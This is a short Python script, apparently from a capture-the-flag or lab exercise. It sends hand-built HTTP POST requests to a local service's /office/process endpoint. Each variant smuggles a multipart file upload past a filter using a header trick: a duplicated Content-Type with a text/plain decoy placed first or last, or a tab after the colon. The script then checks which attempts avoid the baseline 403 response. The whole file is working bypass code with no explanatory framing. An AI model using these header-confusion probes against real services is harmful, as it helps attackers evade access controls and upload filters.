import socket

HOST = "127.0.0.1"
PORT = 1337

def raw(req_bytes):
    s = socket.create_connection((HOST, PORT), timeout=5)
    s.sendall(req_bytes)
    resp = b""
    try:
        while True:
            chunk = s.recv(65536)
            if not chunk:
                break
            resp += chunk
    except socket.timeout:
        pass
    s.close()
    return resp

def status(resp):
    return resp.split(b"\r\n", 1)[0].decode("latin-1", "replace")

body = b'------X\r\nContent-Disposition: form-data; name="file"; filename="a.bin"\r\n\r\nABC\r\n------X--\r\n'

tests = {}

# 1: duplicate content-type, decoy first
tests["dup_decoy_first"] = (
    f"POST /office/process HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n"
    f"Content-Type: text/plain\r\nContent-Type: multipart/form-data; boundary=----X\r\n"
    f"Content-Length: {len(body)}\r\n\r\n"
).encode() + body

# 2: duplicate content-type, decoy last
tests["dup_decoy_last"] = (
    f"POST /office/process HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n"
    f"Content-Type: multipart/form-data; boundary=----X\r\nContent-Type: text/plain\r\n"
    f"Content-Length: {len(body)}\r\n\r\n"
).encode() + body

# 3: leading space via obs-fold style (space after colon is normal, try tab)
tests["leading_tab"] = (
    f"POST /office/process HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n"
    f"Content-Type:\tmultipart/form-data; boundary=----X\r\n"
    f"Content-Length: {len(body)}\r\n\r\n"
).encode() + body

# 4: baseline - should be 403
tests["baseline"] = (
    f"POST /office/process HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n"
    f"Content-Type: multipart/form-data; boundary=----X\r\n"
    f"Content-Length: {len(body)}\r\n\r\n"
).encode() + body

for name, req in tests.items():
    resp = raw(req)
    print(f"{name:20} -> {status(resp)}")
    # print a bit of body for debugging on non-403
    if b"403" not in resp.split(b"\r\n",1)[0]:
        print("    body snippet:", resp[-200:])
